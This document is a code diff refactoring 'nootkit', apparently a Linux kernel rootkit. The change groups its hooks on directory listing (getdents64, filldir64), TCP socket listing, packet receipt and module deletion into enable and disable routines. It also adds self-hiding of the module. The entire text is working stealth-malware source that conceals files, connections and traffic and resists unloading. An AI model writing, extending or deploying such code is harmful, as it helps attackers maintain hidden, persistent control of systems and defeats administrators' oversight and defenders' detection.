@@ -30,9 +30,34 @@ char *hide_packets_strs[MAX_HIDE_ENTITIES];
 int hide_packets_count;
 module_param_array_named(hide_packets, hide_packets_strs, charp, &hide_packets_count, 0);
 
+/// @brief Enable all nootkit hooks
+/// @returns 0 on success, or -errno if any hook failed to set
+static int enable_all_hooks(void)
+{
+    if (hide_hook_enable_filldir64()
+    || hide_hook_enable_tcp_seq_next()
+    || hide_hook_enable_netif_receive_skb_list()) {
+        return -ENOMEM;
+    }
+
+    hide_hook_enable_getdents64();
+    hide_hook_enable_delete_module();
+    
+    return 0;
+}
+
+static void disable_all_hooks(void)
+{
+    hide_hook_disable_getdents64();
+    hide_hook_disable_filldir64();
+    hide_hook_disable_tcp_seq_next();
+    hide_hook_disable_netif_receive_skb_list();
+    hide_hook_disable_delete_module();
+}
+
 int nootkit_init(void)
 {
-    printk(KERN_INFO "Initializing nootkit!\n");
+    int res;
 
     if (config_parse_globals()) {
         printk(KERN_ERR "nootkit: Configuration parsing failed, aborting");
@@ -40,19 +65,26 @@ int nootkit_init(void)
     }
 
     if (!kallsyms_lookup_name_addr) {
-        printk(KERN_ERR "nootkit: kallsyms_lookup_name address not supplied, aborting.");
+        printk(KERN_ERR "nootkit: kallsyms_lookup_name address not supplied, aborting");
         return -EINVAL;
     }
 
     if (resolve_ksyms((void *)kallsyms_lookup_name_addr)) {
-        printk(KERN_ERR "nootkit: Failed to find all required kernel symbols, aborting.");
+        printk(KERN_ERR "nootkit: Failed to find all required kernel symbols, aborting");
         return -EFAULT;
     }
     
-    hide_hook_set_getdents64();
-    hide_hook_set_filldir64();
-    hide_hook_set_tcp_seq_next();
-    hide_hook_set_netif_receive_skb_list_internal();
+    res = enable_all_hooks();
+    if (res) {
+        printk(KERN_ERR "nootkit: Failed to set all hooks, aborting");
+        disable_all_hooks();
+        return res;
+    }
+
+    // no need to call disable for this hide, see it's description
+    hide_enable_thismodule();
+
+    printk(KERN_INFO "nootkit: Initialized!\n");
 
     return 0;
 }
@@ -60,12 +92,8 @@ int nootkit_init(void)
 
 void nootkit_exit(void)
 {
-    hide_hook_unset_getdents64();
-    hide_hook_unset_filldir64();
-    hide_hook_unset_tcp_seq_next();
-    hide_hook_unset_netif_receive_skb_list_internal();
-
-    printk(KERN_INFO "Unloaded nootkit!\n");
+    disable_all_hooks();
+    printk(KERN_INFO "nootkit: Unloaded!\n");
 }
 
 module_init(nootkit_init);
